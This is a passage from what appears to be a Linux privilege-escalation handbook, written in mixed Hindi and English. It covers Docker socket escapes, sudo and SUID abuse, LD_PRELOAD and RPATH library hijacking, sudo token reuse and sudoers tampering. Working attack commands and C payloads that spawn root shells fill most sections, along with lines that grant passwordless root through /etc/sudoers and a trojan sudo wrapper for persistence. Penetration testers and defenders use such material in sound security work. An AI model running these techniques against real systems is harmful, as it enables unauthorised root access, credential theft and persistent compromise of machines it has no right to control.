socket-command-injection.md
{{#endref}}

### HTTP sockets

ध्यान दें कि कुछ **sockets listening for HTTP** requests हो सकते हैं (_मैं .socket files की बात नहीं कर रहा हूँ बल्कि उन फाइलों की जो unix sockets के रूप में काम करती हैं_). आप इसे निम्न से जांच सकते हैं:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
If the socket **HTTP अनुरोध पर प्रतिक्रिया देता है**, तो आप इसके साथ **संचार** कर सकते हैं और संभवतः कुछ **vulnerability को exploit** कर सकते हैं।

### Writable Docker Socket

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Privilege Escalation with Docker CLI**

If you have write access to the Docker socket, you can escalate privileges using the following commands:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
These commands allow you to run a container with root-level access to the host's file system.

#### **Docker API का सीधा उपयोग**

ऐसे मामलों में जहाँ Docker CLI उपलब्ध नहीं है, Docker socket को फिर भी Docker API और `curl` कमांड्स का उपयोग करके नियंत्रित किया जा सकता है।

1.  **List Docker Images:** उपलब्ध images की सूची प्राप्त करें।

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** होस्ट सिस्टम की root डायरेक्टरी को माउंट करने वाला एक container बनाने का अनुरोध भेजें।

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` का उपयोग करके कंटेनर से कनेक्शन स्थापित करें, जिससे उसके अंदर कमांड निष्पादित की जा सकें।

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` कनेक्शन सेट करने के बाद, आप कंटेनर में सीधे ऐसे कमांड चला सकते हैं जिनसे होस्ट की फाइलसिस्टम पर root-स्तरीय पहुंच मिलती है।

### अन्य

ध्यान दें कि यदि आपके पास docker socket पर write permissions हैं क्योंकि आप **inside the group `docker`** में हैं तो आपके पास [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group) हैं। अगर [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising)।

निम्न में docker से बाहर निकलने या इसे दुरुपयोग कर privileges escalate करने के और तरीके देखें:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

यदि आप देखते हैं कि आप **`ctr`** कमांड का उपयोग कर सकते हैं तो निम्न पृष्ठ पढ़ें क्योंकि आप इसे दुरुपयोग करके अनुमतियाँ बढ़ा सकते हैं:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

यदि आप देख रहे हैं कि आप **`runc`** कमांड का उपयोग कर सकते हैं तो निम्न पृष्ठ पढ़ें क्योंकि आप इसे दुरुपयोग करके अनुमतियाँ बढ़ा सकते हैं:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus एक परिष्कृत **inter-Process Communication (IPC) system** है जो applications को कुशलतापूर्वक interact और डेटा साझा करने में सक्षम बनाता है। आधुनिक Linux सिस्टम को ध्यान में रखकर डिज़ाइन किया गया, यह applications के बीच विभिन्न प्रकार के संचार के लिए एक मजबूत फ्रेमवर्क प्रदान करता है।

यह सिस्टम बहुमुखी है, बुनियादी IPC का समर्थन करता है जो प्रक्रियाओं के बीच डेटा एक्सचेंज को बेहतर बनाता है, जो **enhanced UNIX domain sockets** की तरह है। इसके अलावा, यह इवेंट्स या सिग्नल ब्रॉडकास्ट करने में मदद करता है, जिससे सिस्टम कंपोनेंट्स के बीच सहज एकीकरण होता है। उदाहरण के लिए, किसी Bluetooth daemon से आने वाले कॉल के सिग्नल से एक music player म्यूट हो सकता है, जिससे उपयोगकर्ता अनुभव बेहतर होता है। साथ ही, D-Bus एक remote object system का समर्थन करता है, जो applications के बीच service requests और method invocations को सरल बनाता है, उन प्रक्रियाओं को streamline करता है जो पारंपरिक रूप से जटिल थीं।

D-Bus एक **allow/deny model** पर काम करता है, जो मैसेज permissions (method calls, signal emissions, आदि) को matching policy rules के संचयी प्रभाव के आधार पर प्रबंधित करता है। ये policies बस के साथ इंटरैक्शन को निर्दिष्ट करती हैं, और इन permissions के शोषण के माध्यम से संभवतः privilege escalation की अनुमति दे सकती हैं।

उदाहरण के तौर पर `/etc/dbus-1/system.d/wpa_supplicant.conf` में ऐसी एक policy दी गई है, जो root user को `fi.w1.wpa_supplicant1` के मालिक होने, उसे संदेश भेजने और उससे संदेश प्राप्त करने की permissions का विवरण देती है।

किसी विशिष्ट user या group के बिना policies सार्वभौमिक रूप से लागू होती हैं, जबकि "default" context policies उन सभी पर लागू होती हैं जो अन्य विशिष्ट policies द्वारा कवर नहीं होते।
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**यहाँ जानें कि कैसे D-Bus संचार को enumerate और exploit किया जाए:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Network**

यह हमेशा दिलचस्प होता है कि network को enumerate करके machine की स्थिति का पता लगाया जाए।

### सामान्य enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

हमेशा उन network services की जाँच करें जो मशीन पर चल रही हों और जिनके साथ आप उसे access करने से पहले interact नहीं कर पाए थे:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

जांचें कि क्या आप sniff traffic कर सकते हैं। यदि आप ऐसा कर पाते हैं, तो आप कुछ credentials प्राप्त कर सकते हैं।
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

जांचें कि आप **who** हैं, आपके पास कौन से **privileges** हैं, सिस्टम में कौन-कौन से **users** हैं, कौन-कौन **login** कर सकते हैं और किनके पास **root privileges** हैं:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

कुछ Linux संस्करण एक बग से प्रभावित थे जो **UID > INT_MAX** वाले उपयोगकर्ताओं को अधिकार बढ़ाने की अनुमति देता है. अधिक जानकारी: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### समूह

जांचें कि क्या आप किसी ऐसे समूह के **सदस्य** हैं जो आपको root privileges दे सकता है:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### क्लिपबोर्ड

जांचें कि क्लिपबोर्ड के अंदर कुछ भी दिलचस्प है या नहीं (यदि संभव हो)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### पासवर्ड नीति
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### ज्ञात पासवर्ड

यदि आप पर्यावरण का **कोई भी पासवर्ड जानते हैं** तो उस पासवर्ड का उपयोग करके **प्रत्येक उपयोगकर्ता के रूप में लॉगिन करने का प्रयास करें**।

### Su Brute

यदि आपको बहुत शोर होने पर आपत्ति नहीं है और कंप्यूटर पर `su` और `timeout` बाइनरी मौजूद हैं, तो आप [su-bruteforce](https://github.com/carlospolop/su-bruteforce) का उपयोग करके उपयोगकर्ता पर brute-force करने की कोशिश कर सकते हैं.\  
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` पैरामीटर के साथ भी उपयोगकर्ताओं पर brute-force करने की कोशिश करता है।

## लिखने योग्य PATH के दुरुपयोग

### $PATH

यदि आप पाएँ कि आप $PATH के किसी फ़ोल्डर के अंदर **लिख सकते हैं** तो आप escalate privileges कर सकते हैं द्वारा **writable फ़ोल्डर के अंदर backdoor बनाकर** जिसका नाम किसी ऐसे कमांड का होगा जिसे किसी दूसरे उपयोगकर्ता (आदर्श रूप से root) द्वारा चलाया जाएगा और जो **ऐसे फ़ोल्डर से लोड न हो जो आपके writable फ़ोल्डर से पहले $PATH में स्थित हो**।

### SUDO और SUID

आपको कुछ कमांड sudo के माध्यम से चलाने की अनुमति दी गई हो सकती है या उनमें suid bit सेट हो सकता है। इसे जांचने के लिए उपयोग करें:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
कुछ **unexpected commands allow you to read and/or write files or even execute a command.** उदाहरण के लिए:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo कॉन्फ़िगरेशन किसी उपयोगकर्ता को किसी अन्य उपयोगकर्ता के अधिकारों के साथ पासवर्ड जाने बिना कोई कमांड चलाने की अनुमति दे सकता है।
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
इस उदाहरण में उपयोगकर्ता `demo` `root` के रूप में `vim` चला सकता है; अब root directory में एक ssh key जोड़कर या `sh` कॉल करके shell पाना आसान है।
```
sudo vim -c '!sh'
```
### SETENV

यह निर्देश उपयोगकर्ता को किसी कमांड/कार्य को निष्पादित करते समय **set an environment variable** करने की अनुमति देता है:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
यह उदाहरण, **HTB machine Admirer पर आधारित**, **vulnerable** था — स्क्रिप्ट को root के रूप में चलाते समय एक मनमाना python library लोड करने के लिए **PYTHONPATH hijacking** का उपयोग किया जा सकता था:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- यह क्यों काम करता है: non-interactive शेल्स के लिए, Bash `$BASH_ENV` को evaluate करता है और target स्क्रिप्ट चलाने से पहले उस फाइल को source करता है। कई sudo नियम स्क्रिप्ट या shell wrapper चलाने की अनुमति देते हैं। यदि `BASH_ENV` sudo द्वारा संरक्षित है, तो आपकी फाइल root privileges के साथ source की जाती है।

- आवश्यकताएँ:
- एक sudo नियम जिसे आप चला सकते हैं (कोई भी target जो non-interactively `/bin/bash` invoke करता है, या कोई भी bash स्क्रिप्ट)।
- `BASH_ENV` `env_keep` में मौजूद हो (जाँच करें `sudo -l` के साथ)।

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- सुरक्षा सुदृढ़ीकरण:
- `env_keep` से `BASH_ENV` (और `ENV`) हटाएँ, `env_reset` को प्राथमिकता दें।
- sudo-allowed commands के लिए shell wrappers से बचें; minimal binaries का उपयोग करें।
- preserved env vars के उपयोग पर sudo I/O logging और alerting पर विचार करें।

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

यदि `sudo -l` दिखाता है `env_keep+=PATH` या ऐसा `secure_path` जिसमें attacker-writable entries (उदा., `/home/<user>/bin`) शामिल हों, तो sudo-allowed target के अंदर कोई भी relative command shadow किया जा सकता है।

- आवश्यकताएँ: एक sudo नियम (अक्सर `NOPASSWD`) जो एक script/binary चलाता है जो commands को absolute paths के बिना कॉल करता है (`free`, `df`, `ps`, आदि) और PATH का एक writable entry जो पहले खोजा जाता है।
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo execution को बायपास करने वाले paths
**कूदें** अन्य फ़ाइलें पढ़ने के लिए या **symlinks** का उपयोग करें। उदाहरण के लिए sudoers file में: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
यदि एक **wildcard** का उपयोग (\*) किया गया है, तो यह और भी आसान है:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**रोकथाम के उपाय**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

यदि किसी एकल कमांड को **sudo permission** दिया गया है **बिना path निर्दिष्ट किए**: _hacker10 ALL= (root) less_ तो आप इसे PATH variable बदलकर exploit कर सकते हैं
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
यह तकनीक तब भी उपयोग की जा सकती है यदि कोई **suid** binary **executes another command without specifying the path to it (always check with** _**strings**_ **the content of a weird SUID binary)**।

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary जिसमें command path होता है

यदि **suid** binary **executes another command specifying the path**, तो आप उस command के नाम से **export a function** बनाने की कोशिश कर सकते हैं जो suid फ़ाइल कॉल कर रही है।

उदाहरण के लिए, यदि एक suid binary _**/usr/sbin/service apache2 start**_ को कॉल करती है तो आपको उस function को बनाने और export करने की कोशिश करनी चाहिए:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
फिर, जब आप suid binary को कॉल करेंगे, यह फ़ंक्शन निष्पादित होगा

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable का उपयोग एक या अधिक shared libraries (.so files) को निर्दिष्ट करने के लिए किया जाता है जिन्हें loader द्वारा अन्य सभी से पहले लोड किया जाता है, जिसमें standard C library (`libc.so`) भी शामिल है। इस प्रक्रिया को एक लाइब्रेरी का preloading कहा जाता है।

हालाँकि, सिस्टम की सुरक्षा बनाए रखने और इस फीचर के दुरुपयोग को रोकने के लिए, खासकर **suid/sgid** executables के साथ, सिस्टम कुछ शर्तें लागू करता है:

- loader उन executables के लिए **LD_PRELOAD** की परवाह नहीं करता जहाँ real user ID (_ruid_) effective user ID (_euid_) के साथ मेल नहीं खाती।
- suid/sgid वाले executables के लिए केवल वे लाइब्रेरीज़ preload की जाती हैं जो standard paths में हों और स्वयं भी suid/sgid हों।

Privilege escalation हो सकती है यदि आपके पास `sudo` के साथ कमांड्स चलाने की क्षमता है और `sudo -l` के आउटपुट में कथन **env_keep+=LD_PRELOAD** शामिल है। यह कॉन्फ़िगरेशन **LD_PRELOAD** environment variable को बनाए रखने और `sudo` के साथ कमांड चलाने पर भी मान्यता देने की अनुमति देता है, जिससे संभावित रूप से elevated privileges के साथ arbitrary code का निष्पादन हो सकता है।
```
Defaults        env_keep += LD_PRELOAD
```
के रूप में सहेजें **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
फिर **compile it** का उपयोग करके:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
अंत में, **escalate privileges** चलाकर
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> एक समान privesc का दुरुपयोग तब किया जा सकता है अगर attacker **LD_LIBRARY_PATH** env variable को नियंत्रित करता है क्योंकि वह उस पथ को नियंत्रित करता है जहाँ libraries खोजी जाएँगी।
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

यदि किसी बाइनरी में **SUID** permissions हों जो असामान्य दिखाई देता है, तो यह अच्छा अभ्यास है यह सत्यापित करना कि वह सही ढंग से **.so** फ़ाइलें लोड कर रहा है या नहीं। इसे निम्नलिखित कमांड चलाकर किया जा सकता है:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
उदाहरण के लिए, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ जैसी त्रुटि का सामना करने पर यह संभावित exploitation के लिए संकेत देता है।

इसे exploit करने के लिए, एक C फ़ाइल बनाई जाएगी, उदाहरण के लिए _"/path/to/.config/libcalc.c"_, जिसमें निम्नलिखित कोड होगा:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
यह कोड, एक बार संकलित और निष्पादित होने पर, file permissions को बदलकर और elevated privileges वाला shell चलाकर privileges बढ़ाने का प्रयास करता है।

उपरोक्त C फ़ाइल को shared object (.so) फ़ाइल में संकलित करने के लिए:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
अंत में, प्रभावित SUID binary को चलाने से exploit ट्रिगर होना चाहिए, जिससे संभावित system compromise की अनुमति मिल सकती है।

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
अब जब हमने एक SUID binary पाया है जो एक folder से library लोड कर रहा है जहाँ हम write कर सकते हैं, तो चलिए उस folder में आवश्यक नाम के साथ library बनाते हैं:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
यदि आपको इस तरह की त्रुटि मिलती है
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) Unix बाइनरीज़ की एक curated सूची है जिन्हें एक attacker द्वारा स्थानीय सुरक्षा प्रतिबंधों को bypass करने के लिए exploit किया जा सकता है। [**GTFOArgs**](https://gtfoargs.github.io/) वही है लेकिन उन मामलों के लिए जहाँ आप किसी command में **केवल arguments इंजेक्ट** कर सकते हैं।

यह प्रोजेक्ट Unix बाइनरीज़ के वैध फ़ंक्शन्स एकत्र करता है जिन्हें restricted shells से बाहर निकलने, elevated privileges को escalate या बनाए रखने, फाइल ट्रांसफर करने, bind और reverse shells spawn करने, और अन्य post-exploitation कार्यों को आसान बनाने के लिए दुरुपयोग किया जा सकता है।

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

यदि आप `sudo -l` तक पहुँच सकते हैं तो आप टूल [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) का उपयोग कर सकते हैं यह जाँचने के लिए कि यह किसी sudo नियम को exploit करने का तरीका ढूँढता है या नहीं।

### Reusing Sudo Tokens

ऐसे मामलों में जहाँ आपके पास **sudo access** है लेकिन पासवर्ड नहीं है, आप अधिकार बढ़ा सकते हैं—किसी sudo command के execution का इंतज़ार करके और फिर session token को hijack करके।

Requirements to escalate privileges:

- You already have a shell as user "_sampleuser_"
- "_sampleuser_" have **used `sudo`** to execute something in the **last 15mins** (by default that's the duration of the sudo token that allows us to use `sudo` without introducing any password)
- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
- `gdb` is accessible (you can be able to upload it)

(You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` and setting `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- The **second exploit** (`exploit_v2.sh`) _/tmp_ में एक sh shell बनाएगा जो **root के स्वामित्व में setuid के साथ होगा**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- यह **तीसरा exploit** (`exploit_v3.sh`) **एक sudoers file बनाएगा** जो **sudo tokens को स्थायी बनाता है और सभी users को sudo का उपयोग करने की अनुमति देता है**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

यदि आपके पास उस फ़ोल्डर में या फ़ोल्डर के अंदर बनाए गए किसी भी फ़ाइल पर **write permissions** हैं, तो आप बाइनरी [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) का उपयोग करके किसी user और PID के लिए **sudo token** बना सकते हैं।\
उदाहरण के लिए, यदि आप फ़ाइल _/var/run/sudo/ts/sampleuser_ को overwrite कर सकते हैं और उस user के रूप में PID 1234 वाला एक shell आपके पास है, तो आप password जाने बिना **obtain sudo privileges** कर सकते हैं, ऐसा करके:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

फ़ाइल `/etc/sudoers` और `/etc/sudoers.d` के अंदर की फ़ाइलें यह कॉन्फ़िगर करती हैं कि कौन `sudo` का उपयोग कर सकता है और कैसे। ये फ़ाइलें **डिफ़ॉल्ट रूप से केवल user root और group root द्वारा ही पढ़ी जा सकती हैं**.\
**यदि** आप इस फ़ाइल को **पढ़** सकते हैं तो आप **कुछ दिलचस्प जानकारी प्राप्त** कर पाएंगे, और यदि आप किसी भी फ़ाइल को **लिख** सकते हैं तो आप **escalate privileges** कर पाएंगे।
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
यदि आप लिख सकते हैं तो आप इस अनुमति का दुरुपयोग कर सकते हैं।
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
इन permissions का दुरुपयोग करने का एक और तरीका:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD के लिए `doas` जैसी `sudo` बाइनरी के कुछ विकल्प मौजूद हैं; इसके कॉन्फ़िगरेशन को `/etc/doas.conf` में जांचना याद रखें।
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

यदि आप जानते हैं कि एक **user आम तौर पर machine से कनेक्ट होता है और `sudo` का उपयोग करता है** ताकि privileges escalate हो और आपके पास उसी user context में एक shell मिल गया है, तो आप **एक नया sudo executable बना सकते हैं** जो पहले आपका कोड root के रूप में चलाएगा और फिर user के command को चलाएगा। उसके बाद user context का **$PATH** बदलें (उदाहरण के लिए नया path .bash_profile में जोड़कर) ताकि जब user `sudo` चलाए तो आपका sudo executable executed हो जाए।

ध्यान दें कि अगर user किसी अलग shell (bash नहीं) का उपयोग करता है तो आपको नया path जोड़ने के लिए दूसरी फाइलें बदलनी होंगी। उदाहरण के लिए [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` को modifies करता है। आप एक और उदाहरण [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) में पा सकते हैं।

या कुछ ऐसा चलाकर:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## साझा लाइब्रेरी

### ld.so

फ़ाइल `/etc/ld.so.conf` यह दर्शाती है **कि लोड की गई कॉन्फ़िगरेशन फ़ाइलें कहाँ से आ रही हैं**। आमतौर पर, यह फ़ाइल निम्न पथ रखती है: `include /etc/ld.so.conf.d/*.conf`

इसका अर्थ है कि `/etc/ld.so.conf.d/*.conf` से कॉन्फ़िगरेशन फ़ाइलें पढ़ी जाएँगी। ये कॉन्फ़िगरेशन फ़ाइलें उन अन्य फोल्डरों की ओर **इशारा करती हैं** जहाँ **लाइब्रेरीज़** खोजी जाएँगी। उदाहरण के लिए, `/etc/ld.so.conf.d/libc.conf` की सामग्री `/usr/local/lib` है। **इसका अर्थ है कि सिस्टम `/usr/local/lib` के अंदर लाइब्रेरीज़ खोजेगा।**

यदि किसी कारणवश **a user has write permissions** ऊपर बताए गए किसी भी पथ पर: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` के अंदर कोई भी फ़ाइल, या `/etc/ld.so.conf.d/*.conf` के अंदर कॉन्फ़िग फ़ाइल में दिखाए गए किसी भी फ़ोल्डर पर, वह व्यक्ति **escalate privileges** करने में सक्षम हो सकता है.\
निम्न पृष्ठ में देखें **how to exploit this misconfiguration**:

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib को `/var/tmp/flag15/` में कॉपी करने पर, जैसा कि `RPATH` वैरिएबल में निर्दिष्ट है, इसे प्रोग्राम द्वारा इसी स्थान पर उपयोग किया जाएगा।
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
फिर `/var/tmp` में `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` कमांड का उपयोग करके एक दुष्ट लाइब्रेरी बनाएं।
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## क्षमताएँ

Linux capabilities एक process को उपलब्ध root privileges का **एक उपसमुच्चय** प्रदान करते हैं। यह प्रभावी रूप से root को **छोटे और विशिष्ट यूनिट्स में विभाजित** कर देता है। इन यूनिट्स में से हर एक को स्वतंत्र रूप से processes को दिया जा सकता है। इस तरह privileges का पूरा सेट कम हो जाता है, जिससे exploitation के जोखिम घटते हैं।\
अधिक जानकारी और capabilities का दुरुपयोग कैसे किया जा सकता है जानने के लिए निम्न पृष्ठ पढ़ें:


{{#ref}}
linux-capabilities.md
{{#endref}}

## डायरेक्टरी अनुमतियाँ

